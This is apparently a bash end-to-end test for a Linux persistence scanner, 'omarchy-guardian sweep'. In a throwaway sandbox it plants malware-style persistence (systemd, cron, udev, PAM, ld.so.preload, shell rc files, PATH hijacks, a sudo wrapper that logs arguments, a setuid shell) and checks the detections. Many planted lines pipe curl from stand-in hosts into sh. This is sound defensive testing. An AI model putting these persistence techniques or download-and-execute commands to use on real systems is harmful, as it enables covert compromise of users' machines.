#!/bin/bash
# End-to-end tests for `omarchy-guardian sweep`.
#
# Persistence the way PANIX (github.com/Aegrah/PANIX) and real Linux malware
# set it up, plus Omarchy's own places (Hyprland Lua, Omarchy hooks,
# ~/.local/bin), is planted into a throwaway bwrap sandbox, and one sweep
# must list every planted item as untrusted and flag the plainly malicious
# ones with the expected local rule. Nothing touches the live system:
#   * /etc and /usr are throwaway overlays with the planted files as an extra
#     layer; the real pacman database stays visible, so the real packages'
#     files are trusted and only what was planted stands out
#   * HOME is a throwaway directory
#   * the AI review is off for the `system` class, so the results depend on
#     the sweep alone (tests/ai-eval covers the AI's judgement)
#   * root's state (/var/lib/omarchy-guardian: the list of allowed items,
#     the root checks' results) is an empty directory, so nothing the
#     developer allowed on this machine, and no root check that ran here,
#     decides what the sandbox's sweep shows
#
# Not covered here, because they need real root: sudoers drop-ins
# (/etc/sudoers.d is root-only), file capabilities (setcap), the root
# collector, and allowing an item (the list of allowed items is root's, and
# `sweep allow` writes it through sudo; here it must stop before asking
# root, say why, and change nothing).
#
# Requirements: bwrap (0.9 or newer, for --tmp-overlay) and jq.
#
# Usage:
#   cargo build --release
#   bash tests/e2e/sweep.sh
#
# Set GUARDIAN_E2E_ROOT to choose where the scratch directory is created and
# GUARDIAN_E2E_KEEP=1 to keep it for inspection.
set -uo pipefail

PROJECT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
BINARY=$PROJECT/target/release/omarchy-guardian
RUNTIME_DIR=${XDG_RUNTIME_DIR:-/run/user/$(id -u)}
# Always a fresh directory (under GUARDIAN_E2E_ROOT when set), so cleanup
# never removes anything the run did not create.
E2E=$(mktemp -d -p "${GUARDIAN_E2E_ROOT:-$RUNTIME_DIR}" guardian-sweep-XXXXXX) || {
    printf 'cannot create a scratch directory; set GUARDIAN_E2E_ROOT\n' >&2
    exit 2
}
FAILURES=0

if [[ ! -x $BINARY ]]; then
    printf 'Build Guardian first: cargo build --release\n' >&2
    exit 2
fi
for tool in bwrap jq; do
    command -v "$tool" >/dev/null || {
        printf 'missing required tool: %s\n' "$tool" >&2
        exit 77
    }
done

cleanup() {
    [[ -n ${GUARDIAN_E2E_KEEP:-} ]] || rm -rf -- "$E2E"
}
trap cleanup EXIT

export HOME="$E2E/home"
ETC=$E2E/etc-layer
USR=$E2E/usr-layer
mkdir -p "$HOME/.cache" "$HOME/.local/state" "$HOME/tmp" "$ETC" "$USR/bin"
cp -- "$BINARY" "$USR/bin/omarchy-guardian"
mkdir -p "$HOME/.config/omarchy-guardian"
printf '[class.system]\nai = "off"\n' >"$HOME/.config/omarchy-guardian/config.toml"

expect() {
    local name=$1 ok=$2
    if [[ $ok == 0 ]]; then
        printf 'ok   %s\n' "$name"
    else
        printf 'FAIL %s\n' "$name"
        FAILURES=$((FAILURES + 1))
    fi
}

# plant <file> <mode> <content>: a file in a layer or the home directory.
plant() {
    mkdir -p -- "$(dirname -- "$1")"
    printf '%s' "$3" >"$1"
    chmod "$2" "$1"
}

# sweep [args...]: runs the project's sweep in the sandbox, from the home
# directory, with the planted layers over /etc and /usr, in its own process
# namespace (the live checks see only the sandbox's processes). PATH is a
# plain one and the user manager cannot be asked, so the directories the
# sweep looks for shadowing programs in are the same on every machine.
# Root's state is hidden where there is any; a mount point cannot be made
# under the read-only root where there is none, and then there is nothing
# to hide.
ROOT_STATE=()
[[ -d /var/lib/omarchy-guardian ]] && ROOT_STATE=(--tmpfs /var/lib/omarchy-guardian)

sweep() {
    bwrap --ro-bind / / \
        --overlay-src /usr --overlay-src "$USR" --tmp-overlay /usr \
        --overlay-src /etc --overlay-src "$ETC" --tmp-overlay /etc \
        --tmpfs /etc/omarchy-guardian --tmpfs /tmp "${ROOT_STATE[@]}" \
        --bind "$E2E" "$E2E" --unshare-pid --proc /proc --dev /dev \
        --setenv HOME "$HOME" --setenv TMPDIR "$HOME/tmp" \
        --setenv PATH "$HOME/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin" \
        --unsetenv XDG_RUNTIME_DIR --unsetenv DBUS_SESSION_BUS_ADDRESS \
        --setenv OMARCHY_GUARDIAN_NO_NOTIFY 1 \
        --setenv XDG_CONFIG_HOME "$HOME/.config" \
        --setenv XDG_DATA_HOME "$HOME/.local/share" \
        --setenv XDG_CACHE_HOME "$HOME/.cache" \
        --setenv XDG_STATE_HOME "$HOME/.local/state" \
        --chdir "$HOME" --new-session -- "$@"
}

JSON=$E2E/sweep.json

# expect_listed <label> [rule]: the item is listed, by an untrusted tier or
# by being flagged (a setuid copy of a packaged program is still a copy),
# and, with a rule, flagged by it.
expect_listed() {
    local label=$1 rule=${2-}
    local tier flagged
    tier=$(jq -r --arg path "$label" '[.items[] | select(.path == $path) | .tier][0] // "missing"' "$JSON")
    flagged=$(jq -r --arg path "$label" '[.items[] | select(.path == $path) | .flagged][0] // false' "$JSON")
    case $tier:$flagged in
        unknown:* | modified:* | edited:* | user-built:* | copy:true) expect "$label is listed ($tier)" 0 ;;
        *) expect "$label is listed (got: $tier)" 1 ;;
    esac
    if [[ -n $rule ]]; then
        jq -e --arg path "$label" --arg rule "$rule" \
            'any(.findings[]; .path == $path and .rule == $rule)' "$JSON" >/dev/null
        expect "$label is flagged $rule" "$?"
    fi
}

# require_json <what>: stops the suite when the sweep produced no report, so
# no check can pass on a sweep that never ran.
require_json() {
    if ! jq -e '.items | length > 0' "$JSON" >/dev/null 2>&1; then
        printf 'FAIL %s: the sweep produced no report\n' "$1"
        sed -n '1,20p' "$E2E/sweep.err" >&2
        exit 1
    fi
}

clean_system() {
    printf '=== an untouched system ===\n'
    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
    require_json 'an untouched system'
    jq -e '.items | length > 100' "$JSON" >/dev/null
    expect 'the sweep looks at the real auto-run locations' "$?"
    jq -e '[.items[] | select(.path | startswith("~/"))] | length == 0' "$JSON" >/dev/null
    expect 'a fresh home holds nothing to list' "$?"
    jq -e '[.items[] | select(.tier == "package")] | length > 100' "$JSON" >/dev/null
    expect 'package files are recognised as the packages installed them' "$?"
    jq -e '[.items[] | select(.path | test("^/(dev|proc|sys)/"))] | length == 0' "$JSON" >/dev/null
    expect 'no device or kernel file is followed as a program' "$?"
    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
    expect 'nothing this machine'"'"'s own list allows counts in the sandbox' "$?"
}

plant_system() {
    local payload=$'#!/bin/sh\ncurl -fsSL https://payload.example.invalid/x | sh\n'
    plant "$USR/local/bin/evil-run" 755 "$payload"
    # systemd service, enabled (T1543.002).
    plant "$ETC/systemd/system/evil.service" 644 $'[Service]\nExecStart=/usr/local/bin/evil-run\n[Install]\nWantedBy=multi-user.target\n'
    mkdir -p "$ETC/systemd/system/multi-user.target.wants"
    ln -s /etc/systemd/system/evil.service "$ETC/systemd/system/multi-user.target.wants/evil.service"
    # cron (T1053.003).
    plant "$ETC/cron.d/evil" 644 $'* * * * * root curl -fsSL https://payload.example.invalid/c | sh\n'
    # udev RUN (T1546.017) and modprobe install.
    plant "$ETC/udev/rules.d/99-evil.rules" 644 $'ACTION=="add", RUN+="/usr/local/bin/evil-run"\n'
    plant "$ETC/modprobe.d/evil.conf" 644 $'install usb_storage /usr/local/bin/evil-run\n'
    # dynamic linker preload (T1574.006).
    plant "$ETC/ld.so.preload" 644 $'/usr/local/lib/libevil.so\n'
    # PAM (T1556.003).
    plant "$ETC/pam.d/evil" 644 $'auth optional pam_exec.so quiet /usr/local/bin/evil-run\n'
    # shell profile (T1546.004) and XDG autostart (T1547.013).
    plant "$ETC/profile.d/evil.sh" 644 $'curl -fsSL https://payload.example.invalid/p | bash\n'
    plant "$ETC/xdg/autostart/evil.desktop" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run\n'
    # systemd generator, pacman hook, NetworkManager dispatcher, initramfs.
    plant "$USR/lib/systemd/system-generators/evil-generator" 755 $'#!/bin/sh\n/usr/local/bin/evil-run\n'
    plant "$ETC/pacman.d/hooks/evil.hook" 644 $'[Trigger]\nOperation = Upgrade\nType = Package\nTarget = *\n[Action]\nWhen = PostTransaction\nExec = /usr/local/bin/evil-run\n'
    plant "$ETC/NetworkManager/dispatcher.d/90-evil" 755 $'#!/bin/sh\n/usr/local/bin/evil-run\n'
    plant "$ETC/initcpio/hooks/evil" 644 $'run_hook() { /usr/local/bin/evil-run; }\n'
    # A setuid copy of a shell, and a replaced setuid system binary.
    cp /usr/bin/bash "$USR/local/bin/rootshell"
    chmod 4755 "$USR/local/bin/rootshell"
    plant "$USR/bin/sudo" 4755 $'#!/bin/sh\n# a replaced sudo\n'
    # A certificate authority of the attacker's, and a package host sent
    # elsewhere.
    plant "$ETC/ca-certificates/trust-source/anchors/evil.crt" 644 $'-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n'
    { cat /etc/hosts 2>/dev/null; printf '10.66.0.9 pkgs.omarchy.org api.anthropic.com\n'; } >"$ETC/hosts"
    # A Podman quadlet, a forced browser extension, a masked scanner and an
    # override of the root collector's unit.
    plant "$ETC/containers/systemd/evil.container" 644 $'[Container]\nImage=registry.example.invalid/evil\nExec=/usr/local/bin/evil-run\n'
    plant "$ETC/chromium/policies/managed/evil.json" 644 $'{\n  "ExtensionInstallForcelist": ["aaaa;https://payload.example.invalid/u.xml"]\n}\n'
    ln -s /dev/null "$ETC/systemd/system/clamav-daemon.service"
    plant "$ETC/systemd/system/omarchy-guardian-sweep-collect.service.d/quiet.conf" 644 $'[Service]\nExecStart=\nExecStart=/usr/bin/true\n'
}

plant_home() {
    local payload=$'#!/bin/sh\ncurl -fsSL https://payload.example.invalid/h | sh\n'
    plant "$HOME/.cache/payload.sh" 755 "$payload"
    # Omarchy: Hyprland Lua autostart, an Omarchy hook, ~/.local/bin shadowing.
    plant "$HOME/.config/hypr/autostart.lua" 644 $'local o = require("omarchy")\no.exec_on_start("~/.cache/payload.sh")\n'
    plant "$HOME/.config/omarchy/hooks/post-boot.d/evil" 755 $'#!/bin/sh\n~/.cache/payload.sh\n'
    plant "$HOME/.local/bin/sudo" 755 $'#!/bin/sh\nprintf "%s\\n" "$@" >>~/.cache/typed\nexec /usr/bin/sudo "$@"\n'
    # An app launcher that replaces a visible system one's command.
    local launcher
    launcher=$(grep -L '^NoDisplay=true' /usr/share/applications/*.desktop 2>/dev/null | head -n 1)
    launcher=$(basename -- "${launcher:-/usr/share/applications/none.desktop}")
    plant "$HOME/.local/share/applications/$launcher" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run\n'
    LAUNCHER=$launcher
    # A user service, shell start-up, git and SSH.
    plant "$HOME/.config/systemd/user/evil.service" 644 $'[Service]\nExecStart=%h/.cache/payload.sh\n'
    plant "$HOME/.bashrc" 644 $'curl -fsSL https://payload.example.invalid/b | sh\n'
    plant "$HOME/.gitconfig" 644 $'[core]\n\tfsmonitor = ~/.cache/payload.sh\n'
    plant "$HOME/.ssh/authorized_keys" 600 $'command="/usr/local/bin/evil-run" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample planted\n'
    # Guardian's own sweep sent to another home, and its timer masked.
    plant "$HOME/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf" 644 $'[Service]\nEnvironment=HOME=/tmp/elsewhere\n'
    mkdir -p "$HOME/.config/systemd/user.control"
    ln -s /dev/null "$HOME/.config/systemd/user.control/omarchy-guardian-sweep.timer"
    # A unit whose command runs over a continued line, and a quadlet.
    plant "$HOME/.cache/second.sh" 755 "$payload"
    plant "$HOME/.config/systemd/user/cont.service" 644 $'[Service]\nExecStart=/usr/bin/env \\\n    A=1 %h/.cache/second.sh\n'
    plant "$HOME/.config/containers/systemd/evil.container" 644 $'[Container]\nImage=registry.example.invalid/evil\n'
    # A directory put ahead of /usr/bin by a start-up file, with a `git` in
    # it; and a temporary directory on PATH.
    printf 'export PATH="$HOME/tools/bin:$PATH"\nexport PATH="/tmp/bin:$PATH"\n' >>"$HOME/.bashrc"
    plant "$HOME/tools/bin/git" 755 $'#!/bin/sh\nexec /usr/bin/git "$@"\n'
    plant "$HOME/tools/bin/ls" 755 $'#!/bin/sh\nexec /usr/bin/ls "$@"\n'
    plant "$HOME/tools/bin/unrelated-name" 755 $'#!/bin/sh\n'
    # A terminal, a prompt, the idle daemon and tmux that run the payload.
    plant "$HOME/.cache/term.sh" 755 "$payload"
    plant "$HOME/.config/kitty/kitty.conf" 644 $'font_size 11\nshell ~/.cache/term.sh\n'
    plant "$HOME/.config/starship.toml" 644 $'[custom.x]\ncommand = "~/.cache/term.sh"\nwhen = true\n'
    plant "$HOME/.config/hypr/hypridle.conf" 644 $'listener {\n  timeout = 60\n  on-timeout = ~/.cache/term.sh\n}\n'
    plant "$HOME/.tmux.conf" 644 $'run-shell "~/.cache/term.sh"\n'
    # Browser: an extension from the cache, a debugging port, a native host.
    plant "$HOME/.config/chromium-flags.conf" 644 "--load-extension=$HOME/.cache/ext"$'\n--remote-debugging-port=9222\n'
    plant "$HOME/.cache/host" 755 "$payload"
    plant "$HOME/.config/chromium/NativeMessagingHosts/evil.json" 644 "{\"name\": \"evil\", \"path\": \"$HOME/.cache/host\"}"$'\n'
    # The handler of every link clicked, a Flatpak sandbox opened to the
    # home, and package managers sent to another registry.
    plant "$HOME/.config/mimeapps.list" 644 $'[Default Applications]\nx-scheme-handler/https=evil-open.desktop\n'
    plant "$HOME/.local/share/applications/evil-open.desktop" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run %u\n'
    plant "$HOME/.local/share/flatpak/overrides/global" 644 $'[Context]\nfilesystems=home;\n'
    plant "$HOME/.npmrc" 600 $'registry=https://npm.payload.example.invalid/\n//npm.payload.example.invalid/:_authToken=npm_0123456789abcdefSECRET\nscript-shell=/usr/local/bin/evil-run\n'
    plant "$HOME/.cargo/config.toml" 644 $'[build]\nrustc-wrapper = "/usr/local/bin/evil-run"\n'
    plant "$HOME/.config/mise/config.toml" 644 $'[env]\n_.source = "~/.cache/payload.sh"\n'
    plant "$HOME/.config/nvim/init.lua" 644 $'vim.fn.system("curl -fsSL https://payload.example.invalid/n | sh")\n'
    plant "$HOME/.zshenv" 644 $'export ZDOTDIR="$HOME/.hidden-zsh"\n'
    plant "$HOME/.hidden-zsh/.zshrc" 644 $'curl -fsSL https://payload.example.invalid/z | sh\n'
    # Every curl sent through a proxy with its certificate checks off, and
    # npm told to load a script into every Node.js it starts.
    plant "$HOME/.curlrc" 600 $'insecure\nproxy = http://u:curl_0123456789SECRET@10.66.0.9:3128\n'
    printf 'node-options=--require %s/.cache/hook.js\n' "$HOME" >>"$HOME/.npmrc"
    plant "$HOME/.cache/hook.js" 644 $'require("child_process").exec("curl -fsSL https://payload.example.invalid/j | sh")\n'
    # A directory put on PATH behind a test, in a file a login reads and
    # in one that file sources.
    plant "$HOME/.profile" 644 $'[ -d "$HOME/later/bin" ] && export PATH="$HOME/later/bin:$PATH"\n. "$HOME/.config/shell/extra"\n'
    plant "$HOME/.config/shell/extra" 644 $'if true; then PATH=$HOME/sourced/bin:$PATH; fi\nexport PATH=$(tool path):$PATH\n'
    plant "$HOME/later/bin/ssh" 755 $'#!/bin/sh\nexec /usr/bin/ssh "$@"\n'
    plant "$HOME/sourced/bin/gpg" 755 $'#!/bin/sh\nexec /usr/bin/gpg "$@"\n'
}

# expect_flagged <label> <rule>: a finding of that rule on the item.
expect_flagged() {
    jq -e --arg path "$1" --arg rule "$2" \
        'any(.findings[]; .path == $path and .rule == $rule)' "$JSON" >/dev/null
    expect "$1 is flagged $2" "$?"
}

# expect_run_by <label> <by>: the item was reached from the file that runs
# it (named by the end of its path).
expect_run_by() {
    jq -e --arg path "$1" --arg by "$2" \
        'any(.items[]; .path == $path and ((.run_by // "") | endswith($by)))' "$JSON" >/dev/null
    expect "$1 is followed from $2" "$?"
}

planted_system() {
    printf '=== planted persistence ===\n'
    plant_system
    plant_home
    # A program running from the cache directory while the sweep looks.
    sweep bash -c 'cp /usr/bin/sleep ~/.cache/sleeper && { ~/.cache/sleeper 30 & } && sleep 1 && omarchy-guardian sweep --json; status=$?; kill $! 2>/dev/null; exit $status' >"$JSON" 2>"$E2E/sweep.err"
    local status=$?
    require_json 'planted persistence'
    [[ $status == 1 || $status == 2 ]]
    expect "the sweep does not pass a planted system (exit $status)" "$?"

    expect_listed /etc/systemd/system/evil.service
    expect_listed /usr/local/bin/evil-run download-and-execute
    expect_listed /etc/cron.d/evil download-and-execute
    expect_listed /etc/udev/rules.d/99-evil.rules
    expect_listed /etc/modprobe.d/evil.conf
    expect_listed /etc/ld.so.preload
    expect_listed /etc/pam.d/evil
    expect_listed /etc/profile.d/evil.sh download-and-execute
    expect_listed /etc/xdg/autostart/evil.desktop
    expect_listed /usr/lib/systemd/system-generators/evil-generator
    expect_listed /etc/pacman.d/hooks/evil.hook
    expect_listed /etc/NetworkManager/dispatcher.d/90-evil
    expect_listed /etc/initcpio/hooks/evil
    expect_listed /usr/local/bin/rootshell unknown-privileged-file
    expect_listed /usr/bin/sudo modified-package-file

    expect_listed '~/.config/hypr/autostart.lua'
    expect_listed '~/.cache/payload.sh' download-and-execute
    expect_listed '~/.config/omarchy/hooks/post-boot.d/evil'
    expect_listed '~/.local/bin/sudo'
    expect_listed "~/.local/share/applications/$LAUNCHER"
    jq -e --arg path "~/.local/share/applications/$LAUNCHER" '[.items[] | select(.path == $path) | .notes[]] | any(startswith("replaces the launcher"))' "$JSON" >/dev/null
    expect 'the launcher is noted as replacing the system one' "$?"
    expect_listed '~/.config/systemd/user/evil.service'
    expect_listed '~/.bashrc' download-and-execute
    expect_listed '~/.gitconfig' git-config-command
    expect_listed '~/.ssh/authorized_keys' ssh-command
    expect_listed '~/.cache/sleeper' running-from-temp

    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .notes[]] | any(startswith("shadows"))' "$JSON" >/dev/null
    expect 'the ~/.local/bin sudo is noted as shadowing /usr/bin/sudo' "$?"
    jq -e '[.items[] | select(.path == "~/.config/hypr/autostart.lua") | .runs[]] | any(. == "~/.cache/payload.sh")' "$JSON" >/dev/null
    expect 'the Hyprland Lua autostart command is found' "$?"
    jq -e '[.items[] | select(.path == "~/.ssh/authorized_keys" or .path == "~/.gitconfig")] | length == 2' "$JSON" >/dev/null
    expect 'SSH and git files are listed (checked locally only)' "$?"

    # What changes or stands in for Guardian's own units.
    expect_listed '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' guardian-override
    expect_listed '~/.config/systemd/user.control/omarchy-guardian-sweep.timer' guardian-override
    expect_listed /etc/systemd/system/omarchy-guardian-sweep-collect.service.d/quiet.conf guardian-override
    expect_listed /etc/systemd/system/clamav-daemon.service

    # Programs ahead of the system's own, wherever a start-up file puts them.
    expect_listed '~/tools/bin/git' path-hijack
    expect_flagged '~/.local/bin/sudo' path-hijack
    expect_listed '~/tools/bin/ls'
    jq -e '[.findings[] | select(.path == "~/tools/bin/ls" and .rule == "path-hijack")] | length == 0' "$JSON" >/dev/null
    expect 'a program named like an ordinary command is listed, not an alert' "$?"
    jq -e '[.items[] | select(.path == "~/tools/bin/unrelated-name")] | length == 0' "$JSON" >/dev/null
    expect 'a program that takes no command'"'"'s name is not listed' "$?"
    expect_flagged '~/.bashrc' path-hijack

    # Units: continued lines, specifiers, quadlets.
    expect_run_by '~/.cache/second.sh' '/.config/systemd/user/cont.service'
    expect_listed '~/.config/containers/systemd/evil.container'
    expect_listed /etc/containers/systemd/evil.container

    # Terminals, prompts, the idle daemon, tmux.
    expect_listed '~/.config/kitty/kitty.conf'
    expect_listed '~/.config/starship.toml'
    expect_listed '~/.tmux.conf'
    jq -e '[.items[] | select(.path == "~/.cache/term.sh") | .tier][0] == "unknown"' "$JSON" >/dev/null
    expect 'the program a terminal, prompt or idle daemon runs is followed' "$?"
    jq -e '[.items[] | select(.path == "~/.config/hypr/hypridle.conf") | .runs[]] | any(. == "~/.cache/term.sh")' "$JSON" >/dev/null
    expect 'the hypridle on-timeout command is found' "$?"

    # Browser, launchers, sandboxes.
    expect_listed '~/.config/chromium-flags.conf' risky-configuration
    expect_listed /etc/chromium/policies/managed/evil.json risky-configuration
    expect_listed '~/.config/chromium/NativeMessagingHosts/evil.json'
    expect_run_by '~/.cache/host' '/.config/chromium/NativeMessagingHosts/evil.json'
    expect_listed '~/.config/mimeapps.list' risky-configuration
    expect_listed '~/.local/share/applications/evil-open.desktop'
    expect_listed '~/.local/share/flatpak/overrides/global' risky-configuration

    # Developer tools, editors, a moved zsh directory.
    expect_listed '~/.npmrc' risky-configuration
    ! grep -q 'npm_0123456789abcdefSECRET' "$JSON"
    expect 'a registry token is in nothing the sweep prints' "$?"
    expect_listed '~/.cargo/config.toml'
    expect_listed '~/.config/mise/config.toml'
    expect_listed '~/.config/nvim/init.lua' download-and-execute
    expect_listed '~/.hidden-zsh/.zshrc' download-and-execute
    expect_listed '~/.curlrc' risky-configuration
    ! grep -q 'curl_0123456789SECRET' "$JSON"
    expect 'a proxy password is in nothing the sweep prints' "$?"
    expect_run_by '~/.cache/hook.js' '/.npmrc'

    # PATH lines behind a test, in an `if`, and in a sourced file.
    expect_listed '~/later/bin/ssh' path-hijack
    expect_listed '~/sourced/bin/gpg' path-hijack
    jq -e '[.items[] | select(.path == "~/.config/shell/extra") | .notes[]] | any(test("sets PATH in a way Guardian cannot follow"))' "$JSON" >/dev/null
    expect 'a PATH set from a command is said, not passed over' "$?"

    # Trust: a new certificate authority, a redirected host, accounts, keys.
    expect_listed /etc/ca-certificates/trust-source/anchors/evil.crt
    expect_listed /etc/hosts risky-configuration
    jq -e 'any(.items[]; .path == "/etc/passwd#root" and .category == "account")' "$JSON" >/dev/null
    expect 'the accounts that can log in are items' "$?"
    jq -e '[.items[] | select(.path | startswith("~/.ssh/authorized_keys#"))] | length == 1' "$JSON" >/dev/null
    expect 'each authorised key is an item of its own' "$?"
    jq -e '[.items[] | select(.path | startswith("~/.ssh/authorized_keys#")) | .notes[]] | any(test("SHA256:"))' "$JSON" >/dev/null
    expect 'a key is told by its fingerprint' "$?"
    ! grep -q 'AAAAC3NzaC1lZDI1NTE5AAAAIexample' "$JSON"
    expect 'no key is in what the sweep prints' "$?"
}

changes_and_allow() {
    printf '=== changes and allow ===\n'
    # The program that ran from the cache has stopped, so only removals.
    sweep omarchy-guardian sweep --diff >"$E2E/diff.txt" 2>"$E2E/sweep.err"
    grep -q 'Guardian sweep' "$E2E/diff.txt" && ! grep -qE '[+~] (new|changed) ' "$E2E/diff.txt"
    expect 'a second sweep finds nothing new or changed' "$?"

    plant "$HOME/.config/autostart/later.desktop" 644 $'[Desktop Entry]\nExec=/usr/local/bin/evil-run\n'
    sweep omarchy-guardian sweep --diff >"$E2E/diff.txt" 2>"$E2E/sweep.err"
    grep -qE '\+ new +│ ~/\.config/autostart/later\.desktop' "$E2E/diff.txt"
    expect 'a new autostart entry shows as new' "$?"

    # A key that was not there at the last sweep is a finding, not only a
    # changed file.
    printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIsecondkey0123456789abcdefghijklmnopqrstuvw added\n' >>"$HOME/.ssh/authorized_keys"
    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
    require_json 'a new key'
    jq -e '[.findings[] | select(.rule == "new-trust" and (.path | startswith("~/.ssh/authorized_keys#")))] | length == 1' "$JSON" >/dev/null
    expect 'a key added since the last sweep is a finding' "$?"
    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
    jq -e '[.findings[] | select(.rule == "new-trust")] | length == 0' "$JSON" >/dev/null
    expect 'and is no news the sweep after' "$?"
}

# What malware running as the user would do to hide its autostart entry:
# write the entry's fingerprint into the user's own list of allowed items.
# That list counts for nothing; only root's does, and nothing here is root.
self_allow() {
    printf '=== allowing is root'"'"'s to do ===\n'
    local label='~/.config/autostart/later.desktop' digest list
    digest=$(sha256sum "$HOME/.config/autostart/later.desktop" | cut -d' ' -f1)
    list=$(find "$HOME/.local/state" -type d -name sweep | head -n 1)
    [[ -n $list ]]
    expect 'the sweep keeps its state in the home' "$?"
    jq -n --arg label "$label" --arg digest "$digest" \
        --arg override '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' \
        '{($label): $digest, ($override): "anything"}' >"$list/allowed.json"
    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
    require_json 'self-allow'
    jq -e --arg path "$label" '[.items[] | select(.path == $path) | .tier][0] == "unknown"' "$JSON" >/dev/null
    expect 'an entry in the user'"'"'s own list allows nothing' "$?"
    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
    expect 'nothing is allowed without root'"'"'s list' "$?"
    jq -e '.notes | any(test("sweep allow --migrate"))' "$JSON" >/dev/null
    expect 'the sweep says the old list no longer counts, and how to move it' "$?"

    # Allowing asks root through the installed, root-owned Guardian. The
    # sandbox has none (its Guardian is the developer's build, and its
    # sudo a planted script that would say yes to anything): the allow
    # must stop there, say so, and never reach that sudo.
    sweep omarchy-guardian sweep allow "$label" >"$E2E/allow.txt" 2>&1
    [[ $? == 2 ]] && grep -q "root's part needs the installed Guardian" "$E2E/allow.txt" &&
        ! grep -q 'Allowed ' "$E2E/allow.txt"
    expect 'an allow stops where there is no root-owned Guardian to ask root through, and says so' "$?"
    grep -q 'as it is now: ' "$E2E/allow.txt"
    expect 'an allow shows the fingerprint it would allow' "$?"
    sweep omarchy-guardian sweep allow --migrate </dev/null >"$E2E/migrate.txt" 2>&1
    [[ $? == 2 ]] && grep -q 'later.desktop' "$E2E/migrate.txt"
    expect 'the old list is shown, and not moved without a terminal to ask on' "$?"
    # What redirects Guardian's own sweep is refused before root is asked.
    sweep omarchy-guardian sweep allow '~/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf' >"$E2E/allow.txt" 2>&1
    grep -q 'cannot be allowed' "$E2E/allow.txt"
    expect 'an override of Guardian'"'"'s sweep cannot be allowed' "$?"
    sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
    expect 'and the items are all still shown' "$?"

    # An item that changed since the last sweep showed it is not allowed
    # unasked: without a terminal, not at all.
    printf '# changed after the sweep\n' >>"$HOME/.config/autostart/later.desktop"
    sweep omarchy-guardian sweep allow "$label" </dev/null >"$E2E/allow.txt" 2>&1
    [[ $? == 2 ]] && grep -q 'it changed since the last sweep' "$E2E/allow.txt"
    expect 'an item that changed since the last sweep is not allowed unasked' "$?"
}

clean_system
planted_system
changes_and_allow
self_allow

printf '\n'
if [[ $FAILURES == 0 ]]; then
    printf 'ALL SWEEP TESTS PASSED\n'
    exit 0
fi
printf '%d SWEEP TEST(S) FAILED\n' "$FAILURES"
exit 1
